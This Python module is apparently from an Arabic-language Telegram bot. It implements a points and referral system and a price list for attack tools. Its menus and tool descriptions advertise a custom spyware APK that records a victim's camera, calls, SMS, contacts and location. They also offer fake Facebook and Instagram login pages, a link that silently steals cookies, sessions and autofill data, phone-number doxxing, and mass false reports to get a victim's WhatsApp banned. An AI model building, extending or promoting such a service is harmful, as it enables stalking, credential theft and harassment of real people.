# points_system.py
# ============================================================
# الإحالات + نظام النقاط
# v3 — رسائل تأكيد الأدوات + واجهة نظيفة
# ============================================================
import html
import json
import time
import random
import string
from datetime import datetime
from telebot.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
)
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("points_system")

try:
    from config import redis_client, PUBLIC_URL, bot
    logger.info("points_system: Using shared Redis")
except Exception as e:
    logger.error(f"points_system: config failed - {e}")
    redis_client = None
    PUBLIC_URL = "https://example.com"
    bot = None


def h(text):
    """Escape HTML"""
    if text is None:
        return ""
    return html.escape(str(text))


# ============================================================
# [1] الإعدادات
# ============================================================
ADMIN_IDS = [7631249810]
WELCOME_POINTS = 25
REFERRAL_POINTS = 10
REFERRAL_BONUS_5 = 50
REFERRAL_BONUS_10 = 150
REFERRAL_BONUS_25 = 500

# ─── أسعار الأدوات
TOOL_PRICES = {
    "apk": 50,
    "fb_site": 15,
    "ig_site": 15,
    "silent": 20,
    "phone_search": 5,
    "profile_card": 10,
    "wa_report": 15,          # ← أداة حظر واتساب
    "social_engineering": 0,
    "dashboard": 0,
}

# ─── أسماء الأدوات بالعربي
TOOL_NAMES_AR = {
    "apk": "📱 ( تطبيق الضحية APK)",
    "fb_site": "📘 رابط مصيدة فيسبوك",
    "ig_site": "📷 رابط مصيدة انستقرام",
    "silent": "🎯 Silent Collector",
    "phone_search": "📱 بحث رقم هاتف",
    "profile_card": "🎨 Social Profile Card",
    "wa_report": "🚫 حظر رقم واتساب",          # ← الأداة الجديدة
    "social_engineering": "🎭 الهندسة الاجتماعية",
    "dashboard": "🌐 لوحة التحكم",
}

# ─── شرح كل أداة
TOOL_DESCRIPTIONS = {
    "apk": (
        "📱 <b>( تطبيق الضحية APK)</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        " تبنيAPK :مخصص لكل ضحية، لما الضحية تثبته\n"
        "• تستقبل صور من كاميرتها\n"
        "• تسجل صوت ومكالمات\n"
        "• تستقبل رسائل SMS\n"
        "• تجيب جهات الاتصال والموقع\n"
        "• 40+ أمر للتحكم الكامل\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. اكتب اسم الضحية\n"
        "2. البوت يبني APK تلقائياً\n"
        "3. ابعت الـ APK للضحية\n"
        "4. لما تثبته، تبدأ البيانات توصل\n\n"
    ),
    "fb_site": (
        "📘 <b>رابط مصيدة فيسبوك</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "95% صفحة تسجيل دخول فيسبوك مزيفة تشبه الأصل.\n"
        "لما الضحية تدخل بياناتها، توصلك فوراً.\n\n"
        "📋 <b>:الأنواع المتاحة</b> 10 قوالب\n"
        "• تسجيل دخول\n"
        "• استرداد حساب\n"
        "• تحقق OTP\n"
        "• Ads Manager\n"
        "• وغيرها...\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. اختر القالب المناسب\n"
        "2. انسخ الرابط\n"
        "3. ابعته للضحية\n"
        "4. انتظر البيانات\n\n"
    ),
    "ig_site": (
        "📷 <b>رابط مصيدة انستقرام</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "صفحة انستقرام مزيفة بتصميم احترافي.\n"
        "10 قوالب مختلفة (مسابقة، توثيق، إلخ)\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. اختر القالب\n"
        "2. انسخ الرابط\n"
        "3. ابعته للضحية\n\n"
    ),
    "silent": (
        "🎯 <b>Silent Collector</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "رابط يفتح صفحة تحميل عادية، وبنجمع:\n"
        "• IP + بصمة الجهاز\n"
        "• الكوكيز والتخزين\n"
        "• الجلسات النشطة (FB, IG, Google...)\n"
        "• Autofill Hijack (اسم، إيميل، هاتف)\n"
        "• كاميرا (لو وافق)\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. اكتب اسم للضحية\n"
        "2. انسخ الرابط\n"
        "3. ابعته للضحية\n"
        "4. البيانات توصل فوراً\n\n"
    ),
    "phone_search": (
        "📱 <b>بحث برقم الهاتف</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "بحث شامل عن رقم هاتف من 6 مصادر:\n"
        "• اسم صاحب الرقم\n"
        "• الدولة والمحافظة\n"
        "• شركة الاتصال\n"
        "• حسابات مرتبطة (FB, IG, WhatsApp)\n"
        "• Google Dorks\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. اكتب رقم الهاتف\n"
        "2. انتظر التحليل\n"
        "3. النتيجة كاملة\n\n"
    ),
    "profile_card": (
        "🎨 <b>Social Profile Card</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "بروفايل احترافي بأزرار تواصل شغالة.\n"
        "الضحية تشوف البروفايل، تقدر ترفع صورها.\n\n"
        "⚙️ <b>:طريقة الاستخدام</b>\n"
        "1. أدخل 10 حقول (اسم، هاتف، إلخ)\n"
        "2. انسخ الرابط\n"
        "3. ابعته للضحية\n\n"
    ),
    "wa_report": (
        "🚫 <b>حظر رقم واتساب</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "توليد بلاغ رسمي قوي ومتنوع لواتساب\n"
        "عن طريق إيميلك الشخصي\n\n"
        "📋 <b>:الخطوات</b>\n"
        "1. ابعت رقم الضحية\n"
        "2. اختر سبب البلاغ (سبام/نصب/مضايقة...)\n"
        "3. البوت هيولّدلك 25 قالب قوي ومتنوع\n"
        "4. اضغط زر الإرسال → يفتح Gmail\n"
        "5. اضغط Send فقط ✅\n\n"
        "⚡ <b>:للحصول على حظر سريع</b>\n"
        "• كرر العملية من 3-5 إيميلات مختلفة\n"
        "• لا تعدّل النص (عشان البلاغ يبقى موثوق)\n"
        "• كرر كل 3 أيام لو مفيش نتيجة\n\n"
        "⏰ <b>مدة الحظر:</b> 24-72 ساعة\n"
        "📊 <b>معدل النجاح:</b> 60-80%\n"
        "💰 <b>السعر:</b> 15 نقطة"
    ),
    "social_engineering": (
        "🎭 <b>الهندسة الاجتماعية</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "قوالب رسائل جاهزة (واتساب + إيميل):\n"
        "• 10 قوالب واتساب\n"
        "• 10 قوالب إيميل\n\n"
        "✅ <b>100% مجاناً</b>\n\n"
    ),
    "dashboard": (
        "🌐 <b>لوحة التحكم الويب</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎯 <b>:الوظيفة</b>\n"
        "تحكم في كل ضحاياك من المتصفح:\n"
        "• قائمة الضحايا\n"
        "• إرسال أوامر مباشرة\n"
        "• إحصائيات مفصلة\n\n"
        "✅ <b>100% مجاناً</b>\n\n"
    ),
}


# ============================================================
# [2] Helpers
# ============================================================
def _user_key(user_id):
    return f"user:{user_id}"

def _referral_key(code):
    return f"referral:{code}"

def _referral_count_key(user_id):
    return f"referral_count:{user_id}"

def _user_referrals_key(user_id):
    return f"user_referrals:{user_id}"

def _generate_ref_code():
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choices(chars, k=8))

def is_admin(user_id):
    return int(user_id) in ADMIN_IDS

def is_vip(user_id):
    user = get_user(user_id)
    if not user:
        return False
    return user.get("is_vip", False)


# ============================================================
# [3] إدارة المستخدمين
# ============================================================
def get_user(user_id):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_user_key(user_id))
        if raw:
            return json.loads(raw)
    except Exception as e:
        logger.error(f"get_user error: {e}")
    return None


def save_user(user_id, data):
    if not redis_client:
        return False
    try:
        redis_client.set(_user_key(user_id), json.dumps(data, ensure_ascii=False))
        return True
    except Exception as e:
        logger.error(f"save_user error: {e}")
        return False


def create_new_user(user_id, username="Unknown", first_name="User", referred_by=None):
    ref_code = _generate_ref_code()
    attempts = 0
    while redis_client.get(_referral_key(ref_code)) and attempts < 10:
        ref_code = _generate_ref_code()
        attempts += 1

    user = {
        "user_id": user_id,
        "username": username,
        "first_name": first_name,
        "created_at": datetime.utcnow().isoformat(),
        "points": WELCOME_POINTS,
        "total_points_earned": WELCOME_POINTS,
        "total_points_spent": 0,
        "ref_code": ref_code,
        "referred_by": referred_by,
        "referral_count": 0,
        "is_banned": False,
        "is_vip": False,
        "notes": "",
        "history": [],
    }
    save_user(user_id, user)

    if redis_client:
        try:
            redis_client.set(_referral_key(ref_code), str(user_id))
            redis_client.sadd("all_users", str(user_id))
            if referred_by:
                _add_referral_points(referred_by, user_id, first_name)
        except Exception as e:
            logger.error(f"create_new_user redis error: {e}")

    logger.info(f"New user created: {user_id} | ref_code={ref_code}")
    metrics.inc_counter("users_registered")
    return user


def get_or_create_user(user_id, username="Unknown", first_name="User", referred_by=None):
    user = get_user(user_id)
    if not user:
        user = create_new_user(user_id, username, first_name, referred_by)

    user.setdefault("points", 0)
    user.setdefault("total_points_earned", 0)
    user.setdefault("total_points_spent", 0)
    user.setdefault("is_banned", False)
    user.setdefault("is_vip", False)
    user.setdefault("notes", "")
    user.setdefault("history", [])
    user.setdefault("referral_count", 0)
    user.setdefault("referred_by", None)

    if not user.get("ref_code"):
        user["ref_code"] = _generate_ref_code()
        if redis_client:
            try:
                redis_client.set(_referral_key(user["ref_code"]), str(user_id))
            except Exception:
                pass

    return user


def get_all_users():
    if not redis_client:
        return []
    try:
        user_ids = redis_client.smembers("all_users")
        users = []
        for uid in (user_ids or []):
            u = get_user(uid)
            if u:
                users.append(u)
        return users
    except Exception as e:
        logger.error(f"get_all_users error: {e}")
        return []


def delete_user(user_id):
    if not redis_client:
        return False
    try:
        user = get_user(user_id)
        if user and user.get("ref_code"):
            redis_client.delete(_referral_key(user["ref_code"]))
        redis_client.delete(_user_key(user_id))
        redis_client.srem("all_users", str(user_id))
        return True
    except Exception as e:
        logger.error(f"delete_user error: {e}")
        return False


def ban_user(user_id):
    user = get_or_create_user(user_id)
    user["is_banned"] = True
    return save_user(user_id, user)


def unban_user(user_id):
    user = get_or_create_user(user_id)
    user["is_banned"] = False
    return save_user(user_id, user)


# ============================================================
# [4] نظام الإحالات
# ============================================================
def _add_referral_points(referrer_id, new_user_id, new_user_name):
    try:
        referrer = get_user(referrer_id)
        if not referrer:
            return

        referrer["points"] = referrer.get("points", 0) + REFERRAL_POINTS
        referrer["total_points_earned"] = referrer.get("total_points_earned", 0) + REFERRAL_POINTS
        referrer["referral_count"] = referrer.get("referral_count", 0) + 1

        referrer["history"] = referrer.get("history", [])
        referrer["history"].append({
            "type": "referral",
            "user_id": new_user_id,
            "user_name": new_user_name,
            "points": REFERRAL_POINTS,
            "date": datetime.utcnow().isoformat(),
        })
        referrer["history"] = referrer["history"][-50:]

        bonus = 0
        count = referrer["referral_count"]
        if count == 5:
            bonus = REFERRAL_BONUS_5
        elif count == 10:
            bonus = REFERRAL_BONUS_10
        elif count == 25:
            bonus = REFERRAL_BONUS_25

        if bonus > 0:
            referrer["points"] += bonus
            referrer["total_points_earned"] += bonus
            referrer["history"].append({
                "type": "referral_bonus",
                "count": count,
                "points": bonus,
                "date": datetime.utcnow().isoformat(),
            })

        save_user(referrer_id, referrer)

        if bot:
            try:
                msg = (
                    f"🎉 <b>إحالة جديدة!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>الاسم:</b> {h(new_user_name)}\n"
                    f"🆔 <code>{new_user_id}</code>\n"
                    f"💰 <b>+{REFERRAL_POINTS} نقطة</b>\n"
                    f"📊 <b>إجمالي إحالاتك:</b> {count}\n"
                    f"💎 <b>رصيدك:</b> {referrer['points']} نقطة"
                )
                if bonus > 0:
                    msg += f"\n\n🎁 <b>مكافأة {count} إحالات!</b>\n+{bonus} نقطة إضافية"
                bot.send_message(referrer_id, msg, parse_mode="HTML")
            except Exception as e:
                logger.warning(f"notify referrer error: {e}")

        if redis_client:
            try:
                redis_client.sadd(_user_referrals_key(referrer_id), str(new_user_id))
                redis_client.incr(_referral_count_key(referrer_id))
            except Exception:
                pass

        logger.info(f"Referral: {referrer_id} ← {new_user_id} | +{REFERRAL_POINTS} points")
        metrics.inc_counter("referrals")
    except Exception as e:
        logger.exception(f"_add_referral_points error: {e}")


def get_referral_by_code(code):
    if not redis_client:
        return None
    try:
        raw = redis_client.get(_referral_key(code))
        if raw:
            return int(raw)
    except Exception:
        pass
    return None


def get_user_referrals(user_id, limit=50):
    if not redis_client:
        return []
    try:
        referral_ids = redis_client.smembers(_user_referrals_key(user_id)) or []
        result = []
        for rid in list(referral_ids)[:limit]:
            u = get_user(rid)
            if u:
                result.append(u)
        return result
    except Exception:
        return []


# ============================================================
# [5] نظام النقاط
# ============================================================
def add_points(user_id, amount, reason="", admin_action=False):
    if not redis_client:
        return False
    try:
        user = get_or_create_user(user_id)
        user["points"] = user.get("points", 0) + amount
        user["total_points_earned"] = user.get("total_points_earned", 0) + amount
        user["history"] = user.get("history", [])
        user["history"].append({
            "type": "add_points",
            "points": amount,
            "reason": reason,
            "admin": admin_action,
            "date": datetime.utcnow().isoformat(),
        })
        user["history"] = user["history"][-50:]
        save_user(user_id, user)
        logger.info(f"Points added: {user_id} | +{amount} | {reason}")
        return True
    except Exception as e:
        logger.exception(f"add_points error: {e}")
        return False


def remove_points(user_id, amount, reason=""):
    if not redis_client:
        return False
    try:
        user = get_or_create_user(user_id)
        current = user.get("points", 0)
        user["points"] = max(0, current - amount)
        user["total_points_spent"] = user.get("total_points_spent", 0) + amount
        user["history"] = user.get("history", [])
        user["history"].append({
            "type": "remove_points",
            "points": -amount,
            "reason": reason,
            "date": datetime.utcnow().isoformat(),
        })
        user["history"] = user["history"][-50:]
        save_user(user_id, user)
        return True
    except Exception as e:
        logger.exception(f"remove_points error: {e}")
        return False


def set_points(user_id, amount, reason=""):
    if not redis_client:
        return False
    try:
        user = get_or_create_user(user_id)
        old_points = user.get("points", 0)
        user["points"] = max(0, amount)
        user["history"] = user.get("history", [])
        user["history"].append({
            "type": "set_points",
            "old": old_points,
            "new": amount,
            "reason": reason,
            "date": datetime.utcnow().isoformat(),
        })
        user["history"] = user["history"][-50:]
        save_user(user_id, user)
        return True
    except Exception as e:
        logger.exception(f"set_points error: {e}")
        return False


# ============================================================
# [6] التحقق من الصلاحيات
# ============================================================
def can_use_tool(user_id, tool):
    user = get_or_create_user(user_id)

    if user.get("is_banned"):
        return {"allowed": False, "reason": "banned"}

    if is_admin(user_id):
        return {"allowed": True, "reason": "admin", "cost": 0, "balance": 999999}

    if user.get("is_vip"):
        return {"allowed": True, "reason": "vip", "cost": 0, "balance": user.get("points", 0)}

    cost = TOOL_PRICES.get(tool, 0)
    if cost == 0:
        return {"allowed": True, "reason": "free", "cost": 0, "balance": user.get("points", 0)}

    balance = user.get("points", 0)

    if balance >= cost:
        return {
            "allowed": True,
            "reason": "points",
            "cost": cost,
            "balance": balance,
            "remaining": balance - cost,
        }

    return {
        "allowed": False,
        "reason": "insufficient_points",
        "cost": cost,
        "balance": balance,
        "needed": cost - balance,
    }


def consume_usage(user_id, tool):
    user = get_or_create_user(user_id)

    if user.get("is_banned"):
        return False

    if is_admin(user_id) or user.get("is_vip"):
        return True

    cost = TOOL_PRICES.get(tool, 0)
    if cost == 0:
        return True

    balance = user.get("points", 0)
    if balance < cost:
        return False

    user["points"] = balance - cost
    user["total_points_spent"] = user.get("total_points_spent", 0) + cost
    user["history"] = user.get("history", [])
    user["history"].append({
        "type": "tool_used",
        "tool": tool,
        "tool_name": TOOL_NAMES_AR.get(tool, tool),
        "cost": cost,
        "date": datetime.utcnow().isoformat(),
    })
    user["history"] = user["history"][-50:]
    save_user(user_id, user)

    logger.info(f"Tool used: {user_id} | {tool} | -{cost} points")
    metrics.inc_counter("tools_used", tags={"tool": tool})
    return True


# ============================================================
# [7] ★★★ رسالة تأكيد الأداة ★★★
# ============================================================
def build_tool_confirm_text(user_id, tool):
    """يبني رسالة تأكيد الخصم"""
    user = get_or_create_user(user_id)
    points = user.get("points", 0)
    cost = TOOL_PRICES.get(tool, 0)
    tool_name = TOOL_NAMES_AR.get(tool, tool)
    description = TOOL_DESCRIPTIONS.get(tool, f"🎯 <b>{tool_name}</b>\n\n")

    if cost == 0:
        confirm_line = "✅ <b>الأداة مجانية!</b>"
        can_proceed = True
    elif is_admin(user_id) or user.get("is_vip"):
        confirm_line = (
            f"👑 <b>أنت {'' if is_admin(user_id) else 'VIP'} أدمن</b>\n"
            f"✅ <b>الخصم: مجاني</b>"
        )
        can_proceed = True
    elif points >= cost:
        remaining = points - cost
        confirm_line = (
            f"💰 <b>الخصم:</b> <code>{cost}</code> نقطة\n"
            f"💎 <b>رصيدك الحالي:</b> <code>{points}</code> نقطة\n"
            f"✅ <b>هيبقى بعد الخصم:</b> <code>{remaining}</code> نقطة"
        )
        can_proceed = True
    else:
        needed = cost - points
        confirm_line = (
            f"❌ <b>رصيدك غير كافي!</b>\n\n"
            f"💰 <b>المطلوب:</b> <code>{cost}</code> نقطة\n"
            f"💎 <b>رصيدك:</b> <code>{points}</code> نقطة\n"
            f"⚠️ <b>ناقصك:</b> <code>{needed}</code> نقطة\n\n"
            f"💡 <i>شارك رابط الإحالة للحصول على نقاط</i>"
        )
        can_proceed = False

    text = (
        f"{description}"
        f"━━━ 💰 ━━━ الخصم\n"
        f"{confirm_line}"
    )
    return text, can_proceed


def build_tool_confirm_keyboard(tool, can_proceed=True):
    """أزرار تأكيد أو إلغاء"""
    m = InlineKeyboardMarkup()
    if can_proceed:
        m.row(
            InlineKeyboardButton(
                "✅ تأكيد",
                callback_data=f"tool_confirm_{tool}"
            ),
            InlineKeyboardButton(
                "❌ إلغاء",
                callback_data="back_to_main"
            ),
        )
    else:
        m.row(
            InlineKeyboardButton(
                "💰 نقاطي",
                callback_data="points_menu"
            ),
        )
    m.row(
        InlineKeyboardButton(
            "🔙 رجوع",
            callback_data="back_to_main"
        ),
    )
    return m


# ============================================================
# [8] ★★★ الواجهة الرئيسية النظيفة ★★★
# ============================================================
def build_main_menu_keyboard(user_id):
    """القائمة الرئيسية — نظيفة"""
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
    m.add(InlineKeyboardButton("📱 ( تطبيق الضحية APK)", callback_data="v_new"))
    m.add(InlineKeyboardButton("🚫 حظر رقم واتساب", callback_data="wa_report_start"))  # ← جديد
    m.add(InlineKeyboardButton("🌐 ( لوحة التحكم )ويب", callback_data="open_dashboard"))
    m.add(InlineKeyboardButton("🎭 الهندسة الاجتماعية", callback_data="gen_se"))
    m.add(InlineKeyboardButton("🔍 محرك البحث", callback_data="search_menu"))
    m.add(InlineKeyboardButton("🎯 ( جمع المعلومات Silent)", callback_data="gen_silent"))
    m.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
    m.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))

    # ⚙️ الإعدادات فقط (بدون help_guide)
    m.add(InlineKeyboardButton("⚙️ الإعدادات", callback_data="settings_menu"))

    if is_admin(user_id):
        m.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))

    return m


# ============================================================
# [9] ★★★ لوحة الإعدادات ⚙️ ★★★
# ============================================================
def build_settings_menu_keyboard(user_id):
    """قائمة الإعدادات"""
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("💰 نقاطي والإحالات", callback_data="points_menu"))
    m.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
    m.add(InlineKeyboardButton("📖 شرح البوت", callback_data="help_guide"))
    m.add(InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main"))
    return m


def build_settings_menu_text(user_id):
    """نص الإعدادات"""
    user = get_or_create_user(user_id)
    points = user.get("points", 0)
    ref_count = user.get("referral_count", 0)
    return (
        "⚙️ <b>الإعدادات</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"💰 <b>نقاطك:</b> <code>{points}</code>\n"
        f"🎁 <b>إحالاتك:</b> <code>{ref_count}</code>\n\n"
        ":اختر من الأزرار أدناه"
    )


# ============================================================
# [10] لوحة النقاط
# ============================================================
def build_points_menu_keyboard(user_id):
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("🔗 رابط الإحالة الخاص بي", callback_data="my_referral_link"))
    m.add(InlineKeyboardButton("📊 سجل المعاملات", callback_data="points_history"))
    m.add(InlineKeyboardButton("👥 قائمة إحالاتي", callback_data="my_referrals"))
    m.add(InlineKeyboardButton("💎 كيف أكسب نقاط؟", callback_data="how_to_earn"))
    m.add(InlineKeyboardButton("🔙 رجوع للإعدادات", callback_data="settings_menu"))
    return m


def build_points_menu_text(user_id):
    user = get_or_create_user(user_id)
    points = user.get("points", 0)
    ref_code = user.get("ref_code", "—")
    ref_count = user.get("referral_count", 0)
    total_earned = user.get("total_points_earned", 0)
    total_spent = user.get("total_points_spent", 0)

    bot_username = "K_J6bot"
    try:
        from config import bot as cfg_bot
        if cfg_bot:
            me = cfg_bot.get_me()
            bot_username = me.username
    except Exception:
        pass

    ref_link = f"https://t.me/{bot_username}?start=ref_{ref_code}"

    next_bonus = ""
    if ref_count < 5:
        next_bonus = f"🎯 باقي {5 - ref_count} إحالات لتحصل على +{REFERRAL_BONUS_5} نقطة"
    elif ref_count < 10:
        next_bonus = f"🎯 باقي {10 - ref_count} إحالات لتحصل على +{REFERRAL_BONUS_10} نقطة"
    elif ref_count < 25:
        next_bonus = f"🎯 باقي {25 - ref_count} إحالة لتحصل على +{REFERRAL_BONUS_25} نقطة"
    else:
        next_bonus = "🏆 وصلت للحد الأقصى من المكافآت!"

    return (
        f"💰 <b>نظام النقاط</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"💎 <b>رصيدك الحالي:</b> <code>{points}</code> نقطة\n"
        f"📈 <b>إجمالي ما كسبته:</b> <code>{total_earned}</code>\n"
        f"📉 <b>إجمالي ما صرفته:</b> <code>{total_spent}</code>\n\n"
        f"━━━ 🎁 ━━━ الإحالات\n"
        f"👥 <b>عدد إحالاتك:</b> <code>{ref_count}</code>\n"
        f"🔗 <b>كودك:</b> <code>{ref_code}</code>\n\n"
        f"{next_bonus}\n\n"
        f"━━━ 🔗 ━━━ رابطك الخاص\n"
        f"<code>{ref_link}</code>\n\n"
        f"💡 <i>شارك الرابط → كل واحد يخش = +{REFERRAL_POINTS} نقطة</i>"
    )


def build_my_account_text(user_id):
    user = get_or_create_user(user_id)
    points = user.get("points", 0)
    ref_count = user.get("referral_count", 0)
    created = user.get("created_at", "")[:19].replace("T", " ")

    if is_admin(user_id):
        status = "👑 أدمن"
    elif user.get("is_banned"):
        status = "🚫 محظور"
    elif user.get("is_vip"):
        status = "💎 VIP"
    else:
        status = "👤 مستخدم عادي"

    return (
        f"👤 <b>حسابك الشخصي</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>الآيدي:</b> <code>{user_id}</code>\n"
        f"👋 <b>الاسم:</b> {h(user.get('first_name', 'Unknown'))}\n"
        f"📝 <b>Username:</b> @{h(user.get('username', 'N/A'))}\n\n"
        f"📊 <b>الحالة:</b> {status}\n"
        f"📅 <b>التسجيل:</b> <code>{created}</code>\n\n"
        f"💰 <b>رصيدك:</b> <code>{points}</code> نقطة\n"
        f"🎁 <b>إحالاتك:</b> <code>{ref_count}</code>\n"
    )


def build_points_history_text(user_id, limit=10):
    user = get_or_create_user(user_id)
    history = user.get("history", [])[-limit:]

    if not history:
        return "📊 <b>سجل المعاملات</b>\n\n<i>لا يوجد معاملات بعد</i>"

    lines = ["📊 <b>سجل المعاملات</b>\n━━━━━━━━━━━━━━━━━━\n"]
    for item in reversed(history):
        h_type = item.get("type", "")
        date_str = item.get("date", "")[:19].replace("T", " ")
        points = item.get("points", 0)

        if h_type == "referral":
            name = item.get("user_name", "Unknown")
            lines.append(f"🎁 <b>إحالة جديدة</b> - {h(name)}\n  <code>+{points} نقطة</code> • {date_str}")
        elif h_type == "referral_bonus":
            count = item.get("count", 0)
            lines.append(f"🏆 <b>مكافأة {count} إحالات</b>\n  <code>+{points} نقطة</code> • {date_str}")
        elif h_type == "tool_used":
            tool_name = item.get("tool_name", "أداة")
            cost = item.get("cost", 0)
            lines.append(f"🔧 <b>{h(tool_name)}</b>\n  <code>-{cost} نقطة</code> • {date_str}")
        elif h_type == "add_points":
            reason = item.get("reason", "منحة")
            lines.append(f"➕ <b>{h(reason)}</b>\n  <code>+{points} نقطة</code> • {date_str}")
        elif h_type == "remove_points":
            reason = item.get("reason", "خصم")
            lines.append(f"➖ <b>{h(reason)}</b>\n  <code>{points} نقطة</code> • {date_str}")
        elif h_type == "set_points":
            lines.append(f"⚙️ <b>تعديل الرصيد</b>\n  <code>{item.get('old', 0)} → {item.get('new', 0)}</code> • {date_str}")
        lines.append("")

    return "\n".join(lines)


def build_my_referrals_text(user_id, limit=20):
    referrals = get_user_referrals(user_id, limit=limit)

    if not referrals:
        return (
            "👥 <b>قائمة إحالاتي</b>\n"
            "━━━━━━━━━━━━━━━━━━\n\n"
            "📭 <i>لا يوجد إحالات بعد</i>\n\n"
            "💡 ابدأ بمشاركة رابطك للحصول على نقاط!"
        )

    lines = [
        f"👥 <b>قائمة إحالاتي ({len(referrals)})</b>",
        "━━━━━━━━━━━━━━━━━━\n",
    ]
    for i, ref in enumerate(referrals, 1):
        name = ref.get("first_name", "Unknown")[:20]
        username = ref.get("username", "")
        created = ref.get("created_at", "")[:10]
        username_text = f" @{username}" if username else ""
        lines.append(f"{i}. <b>{h(name)}</b>{h(username_text)}\n  📅 {created}")

    return "\n".join(lines)


def build_how_to_earn_text():
    return (
        "💎 <b>كيف تكسب نقاط؟</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "🎁 <b>1. نقاط الترحيب:</b>\n"
        f" • {WELCOME_POINTS} نقطة مجاناً أول ما تسجل\n\n"
        "👥 <b>2. الإحالات (الأسرع):</b>\n"
        f" • كل مستخدم جديد يدخل من رابطك = <b>+{REFERRAL_POINTS} نقطة</b>\n"
        f" • عند 5 إحالات = <b>+{REFERRAL_BONUS_5} نقطة إضافية</b>\n"
        f" • عند 10 إحالات = <b>+{REFERRAL_BONUS_10} نقطة إضافية</b>\n"
        f" • عند 25 إحالة = <b>+{REFERRAL_BONUS_25} نقطة إضافية</b>\n\n"
        "━━━ 💰 ━━━ أسعار الأدوات\n"
        f"📱 <b>APK (ضحية):</b> {TOOL_PRICES['apk']} نقطة\n"
        f"🚫 <b>حظر رقم واتساب:</b> {TOOL_PRICES['wa_report']} نقطة\n"
        f"📘 <b>رابط فيسبوك:</b> {TOOL_PRICES['fb_site']} نقطة\n"
        f"📷 <b>رابط انستقرام:</b> {TOOL_PRICES['ig_site']} نقطة\n"
        f"🎯 <b>Silent Collector:</b> {TOOL_PRICES['silent']} نقطة\n"
        f"📱 <b>بحث رقم:</b> {TOOL_PRICES['phone_search']} نقطة\n"
        f"🎨 <b>Profile Card:</b> {TOOL_PRICES['profile_card']} نقطة\n"
        f"🎭 <b>الهندسة الاجتماعية:</b> مجاناً\n"
        f"🌐 <b>لوحة التحكم:</b> مجاناً\n\n"
        "💡 <b>مثال:</b>\n"
        "10 إحالات = 100 + 50 = 150 نقطة\n"
        "= 3 APK + 5 Silent + 5 بحث رقم"
    )


# ============================================================
# [11] إحصائيات الأدمن
# ============================================================
def build_admin_stats_text():
    users = get_all_users()
    total_users = len(users)
    banned = sum(1 for u in users if u.get("is_banned"))
    vips = sum(1 for u in users if u.get("is_vip"))
    total_points_in_circulation = sum(u.get("points", 0) for u in users)
    total_earned = sum(u.get("total_points_earned", 0) for u in users)
    total_spent = sum(u.get("total_points_spent", 0) for u in users)
    total_referrals = sum(u.get("referral_count", 0) for u in users)

    now = time.time()
    recent = sum(
        1 for u in users
        if u.get("created_at") and
        (now - datetime.fromisoformat(u["created_at"]).timestamp()) < 86400
    )

    return (
        f"📊 <b>إحصائيات النظام</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"━━━ 👥 ━━━ المستخدمون\n"
        f"📊 <b>الإجمالي:</b> <code>{total_users}</code>\n"
        f"🆕 <b>آخر 24 ساعة:</b> <code>{recent}</code>\n"
        f"💎 <b>VIP:</b> <code>{vips}</code>\n"
        f"🚫 <b>محظورين:</b> <code>{banned}</code>\n\n"
        f"━━━ 💰 ━━━ النقاط\n"
        f"💎 <b>في التداول:</b> <code>{total_points_in_circulation}</code>\n"
        f"📈 <b>إجمالي مكتسب:</b> <code>{total_earned}</code>\n"
        f"📉 <b>إجمالي مصروف:</b> <code>{total_spent}</code>\n\n"
        f"━━━ 🎁 ━━━ الإحالات\n"
        f"👥 <b>إجمالي الإحالات:</b> <code>{total_referrals}</code>\n"
        f"📊 <b>معدل:</b> <code>{round(total_referrals / max(total_users, 1), 2)}</code> إحالة/مستخدم\n\n"
        f"━━━ 👑 ━━━ الأدمن\n"
        f"<code>{len(ADMIN_IDS)}</code>"
    )
